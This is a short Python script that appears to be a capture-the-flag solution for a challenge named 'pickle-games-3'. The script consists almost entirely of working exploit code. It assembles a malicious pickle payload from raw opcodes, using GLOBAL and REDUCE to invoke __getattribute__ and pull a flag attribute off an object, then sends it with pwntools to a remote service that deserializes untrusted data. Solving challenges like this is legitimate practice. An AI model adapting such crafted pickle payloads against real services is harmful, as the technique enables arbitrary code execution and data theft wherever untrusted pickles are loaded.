#!/usr/bin/env python3

from pwn import *
import pickle

HOST, PORT, SSL = "pickle-games-3.challs.shellmates.club", 443, True

PAYLOAD = flat(
    pickle.PROTO + b"\x04",
    pickle.GLOBAL + b"__main__\nEmpty.__getattribute__\n",
    pickle.GLOBAL + b"__main__\nflagObj\n",
    pickle.UNICODE + b"flag\n",
    pickle.TUPLE2,
    pickle.REDUCE,
    pickle.STOP,
)

if __name__ == "__main__":
    io = remote(HOST, PORT, ssl=SSL)
    data = PAYLOAD.hex().encode()
    io.recvuntil(b"data: ")
    io.sendline(data)
    io.interactive()
